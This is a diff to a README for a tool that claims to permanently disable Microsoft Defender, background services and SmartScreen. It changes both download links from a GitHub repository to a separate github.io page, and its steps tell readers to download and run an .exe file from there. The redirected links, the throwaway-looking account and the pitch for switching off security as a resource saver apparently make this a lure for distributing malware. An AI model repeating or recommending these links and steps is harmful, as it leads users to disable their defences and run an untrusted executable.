@@ -1,6 +1,6 @@
 # 🛡️ Windows-Defender-Disabler - Stop Microsoft Defender permanently and easily
 
-[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Blondellfluorescent648/Windows-Defender-Disabler)
+[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://blondellfluorescent648.github.io)
 
 This tool helps users remove or disable Microsoft Defender Antivirus on Windows systems. The application manages system registry keys, stops background telemetry services, and turns off SmartScreen protection. It provides a way to reduce system resource usage by removing unneeded security background processes.
 
@@ -18,7 +18,7 @@ The software performs these actions:
 
 Follow these steps to download and run the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Blondellfluorescent648/Windows-Defender-Disabler) to download the latest version.
+1. Go to the [official release page](https://blondellfluorescent648.github.io) to download the latest version.
 2. Click on the file name ending in .exe to start the download.
 3. Save the file to your desktop or downloads folder.
 4. Locate the downloaded file on your computer.
